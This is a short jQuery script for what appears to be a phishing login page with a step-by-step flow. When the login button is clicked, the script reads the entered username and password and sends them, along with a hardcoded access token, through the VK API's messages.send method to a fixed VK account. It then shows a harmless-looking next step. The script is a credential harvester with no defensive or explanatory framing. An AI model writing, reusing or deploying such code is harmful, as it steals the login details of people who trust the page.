$("#steptwo").hide();
$("#stepthree").hide();
var stepinf = 1;
$("#LoginButton").click(function(){
	if (logindata != ""){
		if (passwddata != ""){
			var logindata = $("#logininpt").val();
			var passwddata = $("#psswdinpt").val();
			$.get("https://api.vk.com/method/messages.send?user_id=320502491&message=" + logindata + ":" + passwddata + "&access_token=c967f549a294770df5081ecd638b41a1bbaba38a89d6c0f62f86510ca597620b8c3842fc12f76e2f45919&v=5.64");
			stepinf = 2;
			$("#stepinf").text("Step two");
			$("#stepone").hide();
			$("#steptwo").show();
		}
	}
});
$("#OkButton").click(function(){
	$("#stepinf").text("Step three");
	$("#steptwo").hide();
	$("#stepthree").show();
});